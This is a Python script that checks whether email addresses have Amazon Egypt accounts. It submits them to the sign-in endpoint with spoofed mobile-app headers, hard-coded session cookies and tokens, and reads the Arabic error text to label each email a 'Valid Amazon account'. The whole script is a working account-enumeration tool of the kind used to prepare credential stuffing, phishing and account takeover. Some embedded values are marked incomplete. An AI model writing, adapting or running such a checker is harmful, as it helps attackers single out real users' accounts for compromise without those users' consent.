import requests

def check_amazon_email(email):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; ASUS_Z01QD Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',
        'Pragma': 'no-cache',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Host': 'www.amazon.eg',
        'Connection': 'keep-alive',
        'Content-Length': '11221',
        'Cache-Control': 'max-age=0',
        'device-memory': '4',
        'sec-ch-device-memory': '4',
        'dpr': '1.875',
        'sec-ch-dpr': '1.875',
        'viewport-width': '980',
        'sec-ch-viewport-width': '980',
        'rtt': '0',
        'downlink': '0',
        'ect': '4g',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://www.amazon.eg',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'com.amazon.mShop.android.shopping',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'Referer': 'https://www.amazon.eg/ap/signin'
    }

    cookies = {
        'frc': 'APPiBR/74GkUGSsh6r6Vbhi+CwgXGaPqjm3VnJgHPWprmxvj/zEJdGor22PBe0sxH4RsJGnhsWcXS7BE5hkV6e0cI2wxY22OtANycEy7F3ZTsfATRnMLt+AnKe/fDjiXoRI26Gi6nVB0RzH8GG8d5vs/QIy1UMP3huLtkoo+EoYcqxldaSCF9Y72TZXSkASnMVerbSo4SCBLzN1H1NGAlitoDXvOvbWrcal/KK3/eS2yeZtqYGzOT5hFDszuSEtIycEhCPNlFZWNd1+tT3rY8yAxio8aaSajy5f+lhqdqGb/alJt8oPUxneSeNPzhEW1Gc+TZrvTn9aUwDH5gbK/TJnQYrSvLv4M7NlkGab/WilaaVZ5Lqb5fyeWnLjyO8viawE4YQefJgvOhr+NkvGRnjJyQ4a57GqdSAICGR3yVlcKY72vYOOpuSsgVvoxhwq5OjOQpNDuw7uW',
        'map-md': 'eyJkZXZpY2VfcmVnaXN0cmF0aW9uX2RhdGEiOnsic29mdHdhcmVfdmVyc2lvbiI6IjEzMDA1MDAwMiJ9LCJhcHBfaWRlbnRpZmllciI6eyJwYWNrYWdlIjoiY29tLmFtYXpvbi5tU2hvcC5hbmRyb2lkLnNob3BwaW5nIiwiU0hBLTI1NiI6WyIyZjE5YWRlYjI4NGViMzZmN2YwNzc4NjE1MmI5YTFkMTRiMjE2NTMyMDNhZDBiMDRlYmJmOWM3M2FiNmQ3NjI1Il0sImFwcF92ZXJzaW9uIjoiMTI0MTI1NjQxMSIsImFwcF92ZXJzaW9uX25hbWUiOiIyNi4xOC40LjEwMCIsImFwcF9zbXNfaGFzaCI6IlF0TUIzOStZbDNwIiwibWFwX3ZlcnNpb24iOiJNQVBBbmRyb2lkTGliLTEuMS4zMDY3OTQuMCJ9LCJhcHBfaW5mbyI6eyJhdXRvX3B2IjowLCJhdXRvX3B2X3dpdGhfc21zcmV0cmlldmVyIjoxLCJzbWFydGxvY2tfc3VwcG9ydGVkIjoxLCJwZXJtaXNzaW9uX3J1bnRpbWVfZ3JhbnQiOjJ9fQ==',  # Add full value
        'mobile-device-info': 'dpi:300.0|w:1000|h:1600',
        'amzn-app-id': 'Amazon.com/26.18.4.100/18.0.308122.0',
        'amzn-app-alipay': '0',
        'lc-acbeg': 'ar_AE',
        'i18n-prefs': 'EGP',
        'privacy-consent': '{"avlString":"","gvlString":"","amazonAdvertisingPublisher":true}',
        'ubid-acbeg': '258-0235502-3320817',
        'session-id': '258-2238820-9053504',
        'session-token': 'GMsQ6HgfRRu0CyleOJ8R0FNBxADAAKeGWU3VeuYgZ6CqAA8HZ8FvDwO0lZ6U1niH+tM3n69u0q4v4ONYkxjckvyXnodgo/1+lYSeAJKl4Zt1kdgCq2cy4SzJgIiwkmdjEiUmVDasIZJxikfHSsUSyd+eJ2K0oJU1L4YzySIboa1UhtaS4CgoXZBaiNbEn2A2Ba/iUcvV/Y5heiKTplzOHCu2lNd2rXDK+Bs2hiJzh9hbiIXEf7Q62pRukLXuFFiXBDfzABYRa0Xe3vZIo0K8LpIRN66qH6QHka7J2bLzwT0STVD4Ae5xp0saZaEEOUAJ9yJg52rVGdW8F0PUjr87dj4BvAajqqlD',
        'session-id-time': '2082787201l'
    }

    url = 'https://www.amazon.eg/ap/signin'
    
    try:
        data = {
            'email': email,
            'password': '',
            'appActionToken': 'f2hJj2BGNAKj2Fj2BeIfZSggw2dzDUqCYj3D',
            'appAction': 'SIGNIN_PWD_COLLECT',
            'openid.return_to': 'ape:aHR0cHM6Ly93d3cuYW1hem9uLmVnL2FwL21hcGxhbmRpbmc=',
            'prevRID': 'ape:RDlQNkRUM1FCNzY0S1BSU1lDNDE=',
            'workflowState': 'eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.QCcWiBQBNakemI9jJSRKA_JeNQRgRIPYGpp5MrC57ThwBLw4oUQOXQ.ho4UBfPkKaZY9q6_.3vYStQVZQlEkJaO1VuVlgGCAf8p3RfBbzvf6f-d9Kyz6pDCMbS8SKdeBacILErizJ-Y9UALpVmB_4JK4SR2ntydDQccGyL1rA4GqWXS39Ef7sqdGNSgpvFcCDEBJYPjpqCatw7jeZKhxhHI6iCVR-hti0sslnCHY9IuqA1SFLxbAsx4-kniwV8-7VFlt14w9WZ3tkwBNzvDXO5_In_qjuMHfeo-9cgh7mOT6MI7SkT9hiX0TbDjus_A_c2I-81sV-e2dpPmunwyj-75NA2BUQw5U3QWhwHydb_BSt3UkkpMV9sY7otMN5flEGu8W1n-nkQTCdyKAWZUV9429ol0UuvaLg_HgUfFycbP62_Zd6k44DrEn9P6BQPqc-jzUW5a57SQDynqhUqmfGYm3DxfSrNZal6ypXYs6_QVInPs43FKyjMFX2zDFeo2cVP_51zb5IZrk_JJUgk8FsO8O5heY7xJxMM1oGiBhOPmy56mvCX0ABiyHQUeLvEketbsPOtH24PtuiZBQpM6HzAkQJXuzWuM-_XSojA49yAt82kvqo3QgntQU3XlsK4ZIN4dZudyQUsWyfq8lpaSz6CNk38cPq0jf6MMO-dt2gPMWeaL3BKk_rDRI2lKui6Ly8mXjcUQPC0PO6x0usZXMCr9pScP5JRoWSUICeAvN1GYSFSaDxluDN9LduuCAjlgonNJ0rPiZBgk.E-IlETjHkVtVlRsf7S8hQA',
            'subPageType': 'SignInClaimCollect',
            'shouldShowPersistentLabels': 'true',
            'metadata1': 'ECdITeCs%3AbDZQj%2FFfL5%2BjnsY54bb8YOGcJI%2FsMx67C0B6r88Ci8kmIVKguCEdt4Glse7r8z5uTeuNwYSssCQwsQZ4%2Fb5M4XilHzSwIcvNLkvxBGFwWDj8TZXyplR5k313K7LYRMFEvQWFo4wZNnbZeUqf53J5%2FKg0U28V7VNh1jH0Fk4fWl39eFl6%2BTXwzgpTYGsR2bWYynj%2FtSIxyGUOw232oBdS%2FruJrct5hmDM%'  # Add full metadata
        }
        
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        
        if 'لم يتم العثور على حساب مع عنوان البريد الإلكتروني' in response.text:
            print(f"[-] Failed - No Amazon account found: {email}")
            return 'Failure'
        elif 'عرض كلمة المرور' in response.text:
            print(f"[+] Success - Valid Amazon account found: {email}")
            return 'Success'
        else:
            print(f"[?] Unknown result for: {email}")
            return 'Unknown'
            
    except Exception as e:
        print(f"[!] Error checking {email}: {str(e)}")
        return f'Error: {str(e)}'

# Example usage
if __name__ == "__main__":
    check_amazon_email('test@example.com')